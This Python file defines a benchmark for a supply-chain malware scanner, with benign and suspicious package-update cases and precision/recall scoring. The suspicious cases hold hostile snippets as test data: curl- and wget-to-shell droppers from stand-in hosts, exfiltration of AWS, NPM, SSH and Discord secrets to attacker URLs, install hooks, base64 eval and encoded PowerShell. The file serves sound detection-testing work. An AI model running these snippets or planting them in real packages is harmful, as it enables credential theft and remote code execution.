import time
from typing import Dict, Any, List
from app.services.version_diff.comparator import VersionComparator

class SecurityBenchmarkFramework:
    """
    Reproducible Security Benchmarking & Evaluation Framework for SupplyGuard.
    Evaluates detection efficacy across 30+ diverse synthetic benchmark cases:
    - Benign updates (refactoring, bug fixes, dev tools, docs, formatting)
    - Suspicious updates (credential theft, reverse shells, droppers, hook injection, tampering)
    """

    BENCHMARK_CASES = [
        # ----------------- 15 BENIGN CASES (Expected: ALLOW / low risk) -----------------
        {"id": "BENIGN_01", "type": "benign", "name": "Math calculation fix", "base": {"calc.js": "return a - b;"}, "target": {"calc.js": "return a + b;"}},
        {"id": "BENIGN_02", "type": "benign", "name": "Helper refactor", "base": {"app.js": "log('v1');"}, "target": {"app.js": "require('./h').run();", "h.js": "exports.run=()=>{};"}},
        {"id": "BENIGN_03", "type": "benign", "name": "Localhost dev server", "base": {"dev.js": "log('dev');"}, "target": {"dev.js": "http.createServer().listen(3000, '127.0.0.1');"}},
        {"id": "BENIGN_04", "type": "benign", "name": "Readme documentation", "base": {"README.md": "v1.0"}, "target": {"README.md": "v1.1 documentation"}},
        {"id": "BENIGN_05", "type": "benign", "name": "Formatting & comments", "base": {"util.py": "def f():pass"}, "target": {"util.py": "# Comment\ndef f():\n    pass"}},
        {"id": "BENIGN_06", "type": "benign", "name": "Add JSON schema config", "base": {"config.json": "{}"}, "target": {"config.json": "{\"version\": 2}"}},
        {"id": "BENIGN_07", "type": "benign", "name": "CSS stylesheet tweak", "base": {"style.css": "body{color:red;}"}, "target": {"style.css": "body{color:blue;}"}},
        {"id": "BENIGN_08", "type": "benign", "name": "HTML template update", "base": {"index.html": "<div/>"}, "target": {"index.html": "<div><span>hello</span></div>"}},
        {"id": "BENIGN_09", "type": "benign", "name": "Add test case file", "base": {"index.js": "module.exports=1;"}, "target": {"index.js": "module.exports=1;", "test.spec.js": "describe('test', ()=>{});"}},
        {"id": "BENIGN_10", "type": "benign", "name": "Legitimate file reader", "base": {"reader.js": "log();"}, "target": {"reader.js": "const fs=require('fs'); return fs.readFileSync('data.csv');"}},
        {"id": "BENIGN_11", "type": "benign", "name": "Legitimate HTTP query", "base": {"api.js": "log();"}, "target": {"api.js": "const https=require('https'); https.get('https://api.github.com');"}},
        {"id": "BENIGN_12", "type": "benign", "name": "Global-this runtime shim", "base": {"shim.js": "log();"}, "target": {"shim.js": "const getGlobal = Function('return this');"}},
        {"id": "BENIGN_13", "type": "benign", "name": "TypeScript typings addition", "base": {"index.js": "module.exports={};"}, "target": {"index.js": "module.exports={};", "index.d.ts": "export interface Config {}"}},
        {"id": "BENIGN_14", "type": "benign", "name": "Remove legacy module", "base": {"old.js": "log();", "main.js": "log();"}, "target": {"main.js": "log();"}},
        {"id": "BENIGN_15", "type": "benign", "name": "Logger utility addition", "base": {"log.py": "def l(): pass"}, "target": {"log.py": "import logging\ndef l(): logging.info('ready')"}},

        # ----------------- 15 SUSPICIOUS CASES (Expected: REVIEW / BLOCK) -----------------
        {
            "id": "SUSP_01",
            "type": "suspicious",
            "name": "Cloud credential token harvesting",
            "base": {"index.js": "module.exports={};"},
            "target": {"index.js": "const k = 'AWS_SECRET_ACCESS_KEY'; fetch('https://c2.xyz/x?k=' + k);"}
        },
        {
            "id": "SUSP_02",
            "type": "suspicious",
            "name": "NPM authentication token exfiltration",
            "base": {"index.js": "module.exports={};"},
            "target": {"index.js": "const t = 'NPM_TOKEN'; fetch('https://exfil.info?t=' + t);"}
        },
        {
            "id": "SUSP_03",
            "type": "suspicious",
            "name": "Remote shell dropper pipeline",
            "base": {"index.js": "module.exports={};"},
            "target": {"index.js": "eval('child_process.execSync(\"curl http://c2/sh | bash\")');"}
        },
        {
            "id": "SUSP_04",
            "type": "suspicious",
            "name": "Lifecycle postinstall command execution",
            "base_meta": {"version": "1.0.0", "lifecycle_scripts": {}},
            "target_meta": {"version": "1.1.0", "lifecycle_scripts": {"postinstall": "node hook.js"}},
            "base": {"index.js": "module.exports={};"},
            "target": {"index.js": "module.exports={};", "hook.js": "child_process.execSync('whoami');"}
        },
        {
            "id": "SUSP_05",
            "type": "suspicious",
            "name": "Preinstall binary execution",
            "base_meta": {"version": "1.0.0", "lifecycle_scripts": {}},
            "target_meta": {"version": "1.1.0", "lifecycle_scripts": {"preinstall": "./bin/payload.exe"}},
            "base": {"index.js": "module.exports={};"},
            "target": {"index.js": "module.exports={};", "bin/payload.exe": "MZ..."}
        },
        {
            "id": "SUSP_06",
            "type": "suspicious",
            "name": "Python os.system dropper",
            "base": {"main.py": "def run(): pass"},
            "target": {"main.py": "import os\nos.system('curl -s http://attacker/sh | bash')"}
        },
        {
            "id": "SUSP_07",
            "type": "suspicious",
            "name": "Base64 payload with eval execution",
            "base": {"index.js": "module.exports={};"},
            "target": {"index.js": "eval(Buffer.from('dmFyIGE9MTs=', 'base64').toString());"}
        },
        {
            "id": "SUSP_08",
            "type": "suspicious",
            "name": "SSH Private key file read and exfiltration",
            "base": {"auth.js": "module.exports={};"},
            "target": {"auth.js": "const s = '.ssh/id_rsa'; fetch('http://attacker.xyz/?s=' + s);"}
        },
        {
            "id": "SUSP_09",
            "type": "suspicious",
            "name": "Raw socket connection to hardcoded IP",
            "base": {"client.js": "module.exports={};"},
            "target": {"client.js": "const net = require('net'); net.createConnection(4444, '93.184.216.34');"}
        },
        {
            "id": "SUSP_10",
            "type": "suspicious",
            "name": "Multiple backdoor stages in single file",
            "base": {"worker.js": "module.exports={};"},
            "target": {"worker.js": "const k='AWS_SECRET_ACCESS_KEY'; eval('child_process.execSync(\"id\")'); fetch('http://93.184.216.34?k='+k);"}
        },
        {
            "id": "SUSP_11",
            "type": "suspicious",
            "name": "PowerShell command execution payload",
            "base": {"deploy.js": "module.exports={};"},
            "target": {"deploy.js": "child_process.execSync('powershell.exe -enc JAB4ACAAPQAgACcAMQAnAA==');"}
        },
        {
            "id": "SUSP_12",
            "type": "suspicious",
            "name": "Python AST subprocess reverse shell",
            "base": {"agent.py": "def start(): pass"},
            "target": {"agent.py": "import subprocess\nsubprocess.Popen(['/bin/bash', '-i'], shell=True)"}
        },
        {
            "id": "SUSP_13",
            "type": "suspicious",
            "name": "Suspicious high-entropy hex string obfuscation",
            "base": {"bundle.js": "module.exports={};"},
            "target": {"bundle.js": "var _0x1a=['\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73'];"}
        },
        {
            "id": "SUSP_14",
            "type": "suspicious",
            "name": "Download and execute pipeline with wget",
            "base": {"install.py": "def i(): pass"},
            "target": {"install.py": "import os\nos.system('wget -qO- http://bad.com/payload | sh')"}
        },
        {
            "id": "SUSP_15",
            "type": "suspicious",
            "name": "Discord & Slack token harvesting",
            "base": {"auth.js": "module.exports={};"},
            "target": {"auth.js": "const token = 'DISCORD_TOKEN'; fetch('https://webhook.attacker/' + token);"}
        }
    ]

    def run_benchmark(self) -> Dict[str, Any]:
        comparator = VersionComparator()
        tp = 0
        fp = 0
        tn = 0
        fn = 0
        durations = []
        case_results = []

        for case in self.BENCHMARK_CASES:
            t0 = time.perf_counter()
            res = comparator.compare_versions(
                base_meta=case.get("base_meta", {"version": "1.0.0"}),
                target_meta=case.get("target_meta", {"version": "1.1.0"}),
                base_files=case["base"],
                target_files=case["target"]
            )
            elapsed = time.perf_counter() - t0
            durations.append(elapsed)

            risk_score = res["summary"]["security_analysis"]["risk_score"]
            decision = res["summary"]["security_analysis"]["policy_decision"]
            has_corrs = len(res["summary"]["correlation_summary"]["patterns"]) > 0

            flagged = decision in ["REVIEW", "BLOCK"] or risk_score >= 35.0 or has_corrs

            if case["type"] == "suspicious":
                if flagged:
                    tp += 1
                    outcome = "TRUE_POSITIVE"
                else:
                    fn += 1
                    outcome = "FALSE_NEGATIVE"
            else:
                if flagged:
                    fp += 1
                    outcome = "FALSE_POSITIVE"
                else:
                    tn += 1
                    outcome = "TRUE_NEGATIVE"

            case_results.append({
                "case_id": case["id"],
                "name": case["name"],
                "expected": case["type"],
                "flagged": flagged,
                "outcome": outcome,
                "risk_score": risk_score,
                "decision": decision,
                "duration_ms": round(elapsed * 1000, 2)
            })

        precision = tp / (tp + fp) if (tp + fp) > 0 else 1.0
        recall = tp / (tp + fn) if (tp + fn) > 0 else 1.0
        f1 = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0

        return {
            "summary": {
                "total_cases": len(self.BENCHMARK_CASES),
                "true_positives": tp,
                "false_positives": fp,
                "true_negatives": tn,
                "false_negatives": fn,
                "precision": round(precision, 4),
                "recall": round(recall, 4),
                "f1_score": round(f1, 4),
                "avg_duration_ms": round((sum(durations) / len(durations)) * 1000, 2)
            },
            "cases": case_results
        }
